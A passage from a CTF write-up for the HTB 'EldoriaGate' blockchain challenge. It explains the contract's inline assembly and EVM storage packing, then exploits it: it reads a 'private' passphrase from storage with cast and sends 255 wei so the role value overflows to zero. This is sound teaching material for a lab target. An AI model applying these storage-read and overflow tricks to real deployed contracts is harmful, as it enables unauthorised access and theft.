+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>mstore(<span style="color:#d699b6">0x00</span>, _unknown)
+</span></span><span style="display:flex;"><span>id <span style="color:#7a8478">:=</span> <span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">0x00</span>, <span style="color:#d699b6">0x20</span>)
+</span></span><span style="display:flex;"><span>sstore(villagerSlot, id)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>_unknown</code> is stored at address 0x0, then it is hashed with keccak256 and stored in the <code>id</code> variable. Finally, the result is stored at the <code>villagerSlot</code> computed previously.</p>
+<p>So, the id is actually the <code>_unknown</code> address hashed with keccak256 and casted in uint (i guess ??).</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">let</span> storedPacked <span style="color:#7a8478">:=</span> sload(add(villagerSlot, <span style="color:#d699b6">1</span>))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>storedPacked</code> store the value at <code>villagerSlot + 1</code> which reads the next values in the <code>Villager</code> struct, the <code>authenticated</code> and <code>roles</code> variables :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">struct</span> Villager {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint</span> id;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bool</span> authenticated;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> roles;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And an operation to check the value is made :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">let</span> storedAuth <span style="color:#7a8478">:=</span> and(storedPacked, <span style="color:#d699b6">0xff</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">if</span> iszero(storedAuth) { <span style="color:#d699b6">revert</span>(<span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>) }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>A bitwise AND operation with <code>0xff</code> and <code>storedAuth</code> (either 1 or 0).</p>
+<p>The result of this operation is zero if the villager is not authenticated, and one if yes.</p>
+<blockquote>
+<p>But at this stage the villager, can only be authenticated because the function is reverted before getting here if the villager is not authenticated.</p>
+</blockquote>
+<p>Now, the part setting the role begin.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">let</span> defaultRolesMask <span style="color:#7a8478">:=</span> ROLE_SERF
+</span></span><span style="display:flex;"><span>roles <span style="color:#7a8478">:=</span> add(defaultRolesMask, _contribution)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>defaultRolesMask</code> is a number initally set to 1 (SERF), meaning we first start at the SERF role.</p>
+<p>Then, the contribution is added to our role (with a contribution of 0, the role is still to a value of 1) and stored in <code>roles</code>.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">if</span> lt(roles, defaultRolesMask) { <span style="color:#d699b6">revert</span>(<span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>) }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The operation is reverted if <code>roles &lt; 1</code>, but it&rsquo;s not supposed to happen as <code>roles</code> is initially set at 1.</p>
+<p>Finally,</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">let</span> packed <span style="color:#7a8478">:=</span> or(storedAuth, shl(<span style="color:#d699b6">8</span>, roles))
+</span></span><span style="display:flex;"><span>sstore(add(villagerSlot, <span style="color:#d699b6">1</span>), packed)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The roles value is shifted 8 bytes to the left and combined with the auth bit with a bitwise OR.</p>
+<p>Then, <code>packed</code> (actually containing the concatenation of <code>roles</code> followed by the auth bit) is stored at <code>villagerSlot + 1</code>, where we initially read the auth bit.</p>
+<p>To wrap up,</p>
+<ul>
+<li>
+<p>The location for our address in the villager mapping is computed.</p>
+</li>
+<li>
+<p>Then the authenticated bit is read from here on the slot just after.</p>
+</li>
+<li>
+<p>Finally, our role is computed by <code>1 + contribution</code>, shifted by 8, concatenated with the auth bit and then stored in the struct.</p>
+</li>
+</ul>
+<h4 id="hasrole">hasRole</h4>
+<p>This last function is called by <a href="#getvillagerroles">getVillagerRoles</a> to check from the roles mask, which bits are set to know which roles are present for a villager.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">hasRole</span>(<span style="color:#dbbc7f">address</span> _villager, <span style="color:#dbbc7f">uint8</span> _role) <span style="color:#e67e80">external</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span> hasRoleFlag) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">assembly</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x0</span>, _villager)
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x20</span>, villagers.slot)
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> villagerSlot <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">keccak256</span>(<span style="color:#d699b6">0x0</span>, <span style="color:#d699b6">0x40</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> packed <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">sload</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> roles <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">and</span>(shr(<span style="color:#d699b6">8</span>, packed), <span style="color:#d699b6">0xff</span>)
+</span></span><span style="display:flex;"><span>        hasRoleFlag <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">gt</span>(<span style="color:#b2c98f">and</span>(roles, _role), <span style="color:#d699b6">0</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Again, the routine to compute the location of the villager in the <code>villagers</code> mapping inside the EVM storage and store it in <code>villagerSlot</code> :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>mstore(<span style="color:#d699b6">0x0</span>, _villager)
+</span></span><span style="display:flex;"><span>mstore(<span style="color:#d699b6">0x20</span>, villagers.slot)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">let</span> villagerSlot <span style="color:#7a8478">:=</span> <span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">0x0</span>, <span style="color:#d699b6">0x40</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then the value at <code>villagerSlot, 1</code> is loaded, which contains in the lower bit the auth bit (see the villager struct).</p>
+<p>To better understand this, let&rsquo;s review the storage in the EVM.</p>
+<p>In the EVM, a variable value is stored on what his called &ldquo;a slot&rdquo;. And a slot have a size of 32 bytes.</p>
+<ul>
+<li>If a value have a length of 32, it takes th full slot</li>
+<li>If a value have a length of 20 bytes and is followed by a value of 4 bytes for instance, they take the same slot in order to save EVM storage.</li>
+</ul>
+<p>In the Villager struct there are three values:</p>
+<ul>
+<li><code>uint id</code> -&gt; <code>uint256</code> -&gt;  32 bytes -&gt; first slot</li>
+<li><code>bool authenticated</code> -&gt; 1 byte -&gt; second slot</li>
+<li><code>uint8 roles</code> -&gt; 8 byte -&gt; second slot</li>
+</ul>
+<p>Meaning the <code>authenticated</code> variable is sharing the same slot as the <code>roles</code> variable. <a href="https://www.rareskills.io/post/evm-solidity-storage-layout">See more</a>.</p>
+<p>Let&rsquo;s see the next assembly code :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">let</span> packed <span style="color:#7a8478">:=</span> sload(add(villagerSlot, <span style="color:#d699b6">1</span>))
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">let</span> roles <span style="color:#7a8478">:=</span> and(shr(<span style="color:#d699b6">8</span>, packed), <span style="color:#d699b6">0xff</span>)
+</span></span><span style="display:flex;"><span>hasRoleFlag <span style="color:#7a8478">:=</span> gt(and(roles, _role), <span style="color:#d699b6">0</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The second storage slot in the struct of the <code>villager</code> value is loaded, and <code>roles</code> is shifted to the right by 8. It was shifted left beforehand in <a href="#evaluateidentity">evaluateIdentity</a>, so it allow us to retrieve the <code>roles</code>.</p>
+<p>After that, a bitwise AND is made with <code>roles</code> and <code>0xff</code>.</p>
+<p>Finally, it checks if a 1 is present at the position of each role checked in the <code>roles</code> value for the current villager :</p>
+<p><img src="../../images/writeups/htb-cyber-apocalypse/my-role.jpg" alt="my role"></p>
+<p>Then returns <code>hasRoleFlag</code> with the value.</p>
+<h1 id="solving">Solving</h1>
+<h2 id="get-authenticated">Get authenticated</h2>
+<p>So, to solve we have to be authenticated and have a role equal to zero, meaning not having any role at all.</p>
+<p>First to be authenticated we have to find the passphrase.</p>
+<p>This passphrase is stored on the EldoriaGateKernel contract but with the visibility <code>private</code>.</p>
+<p>But even if it&rsquo;s private, we can read it directly from the storage as it is public on the blockchain. (see <a href="https://book.getfoundry.sh/reference/cast/cast-storage">cast storage</a>)</p>
+<p>To know the storage slot to look at we can use <a href="https://book.getfoundry.sh/reference/forge/forge-inspect">forge inspect</a> :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>forge inspect EldoriaGateKernel.sol:EldoriaGateKernel --root . storage    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭---------------+-------------------------------------------------------+------+--------+-------+
+</span></span><span style="display:flex;"><span>| Name          | Type                                                  | Slot | Offset | Bytes |
+</span></span><span style="display:flex;"><span>+================================================================================================
+</span></span><span style="display:flex;"><span>| eldoriaSecret | bytes4                                                | 0    | 0      | 4     |
+</span></span><span style="display:flex;"><span>|---------------+-------------------------------------------------------+------+--------+-------+
+</span></span><span style="display:flex;"><span>| villagers     | mapping(address =&gt; struct EldoriaGateKernel.Villager) | 1    | 0      | 32    |
+</span></span><span style="display:flex;"><span>|---------------+-------------------------------------------------------+------+--------+-------+
+</span></span><span style="display:flex;"><span>| frontend      | address                                               | 2    | 0      | 20    |
+</span></span><span style="display:flex;"><span>╰---------------+-------------------------------------------------------+------+--------+-------+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With that we know the passphrase is at the first slot.</p>
+<p>And we can read it with :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#859289;font-style:italic"># get the kernel address</span>
+</span></span><span style="display:flex;"><span>cast call -r $RPC $TARGET <span style="color:#b2c98f">&#34;kernel()(address)&#34;</span> 
+</span></span><span style="display:flex;"><span>0x79C71Dc194e4bbEd8e33d3419858B6AEA1a163B3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast storage -r $RPC 0x79C71Dc194e4bbEd8e33d3419858B6AEA1a163B3 <span style="color:#d699b6">0</span>
+</span></span><span style="display:flex;"><span>0x00000000000000000000000000000000000000000000000000000000deadfade
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So the passphrase is <code>0xdeadfade</code>.</p>
+<h2 id="have-an-empty-role">Have an empty role</h2>
+<p>Now that we have the passphrase, we need to have an empty role.</p>
+<p>We know that the role bits are read a from a number on 8 bits.</p>
+<p><a href="#hasrole">In the assembly</a> we saw that roles a bitwise AND with the role and 0xff is made in order to read it.</p>
+<p>Thus, if we manage to have a role value that result to zero when put on a bitwise AND with 0xff, example of a bitwise AND with a role value of 1 (SERF) :</p>
+<p><img src="../../images/writeups/htb-cyber-apocalypse/eldoriagate-roles-and-0xff.jpg" alt="bitwise and"></p>
+<p>We get 1.</p>
+<p>And with a value of 256 we got a result of 0 :</p>
+<p><img src="../../images/writeups/htb-cyber-apocalypse/eldoriagate-roles-256-and-0xff.jpg" alt="bitwise and with 256"></p>
+<p>Which result in an empty role.</p>
+<p>Now, how do we submit a value of 256 ?</p>
+<p>First remember that the role is one by default (see <a href="#evaluateidentity">evaluateIdentity</a>).</p>
+<p>And our contribution is added to this one to get another role.</p>
+<p>So we have to add <code>255</code> to this value. And we can do by sending some value when calling <code>enter()</code>.</p>
+<blockquote>
+<p>But 1 ether is not the smallest unit, 1 ether is actually equal to $1 * 10^{18}$ wei. We need to send wei and not ethers.</p>
+</blockquote>
+<br>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast send -r $RPC $TARGET --value 255wei --private-key $PKEY <span style="color:#b2c98f">&#34;enter(bytes4)&#34;</span> 0xdeadfade
+</span></span><span style="display:flex;"><span><span style="color:#7a8478">(</span>success<span style="color:#7a8478">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we can check our role :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast call -r $RPC $TARGET <span style="color:#b2c98f">&#34;getVillagerRoles(address)(string)&#34;</span> $ADDRESS                                      
+</span></span><span style="display:flex;"><span><span style="color:#b2c98f">&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It is empty as wanted.</p>
+<p><code>HTB{unkn0wn_1ntrud3r_1nsid3_...}</code></p>
+<h1 id="references">References</h1>
+<ul>
+<li><a href="https://www.rareskills.io/post/solidity-dynamic">Storage Slots of Dynamic Types (Mappings, Arrays, Strings, Bytes)</a></li>
+<li><a href="https://blog.openzeppelin.com/deconstructing-a-solidity-smart-contract-part-i-introduction-832efd2d7737">Deconstructing a Solidity Smart Contract</a></li>
+<li><a href="https://docs.soliditylang.org/en/latest/assembly.html">Solidity - Inline assembly</a></li>
+<li><a href="https://www.rareskills.io/post/evm-solidity-storage-layout">Rareskills - EVM solidity storage layout</a></li>
+<li><a href="https://dev.to/ceasermikes002/understanding-how-the-evm-stores-mappings-arrays-and-structs-in-solidity-5adh">Understanding How the EVM Stores Mappings, Arrays, and Structs in Solidity - DEV Community</a></li>
+</ul>
+</article>
+
+            </div>
+        </main>
+
+  
+    </body>
+</html>
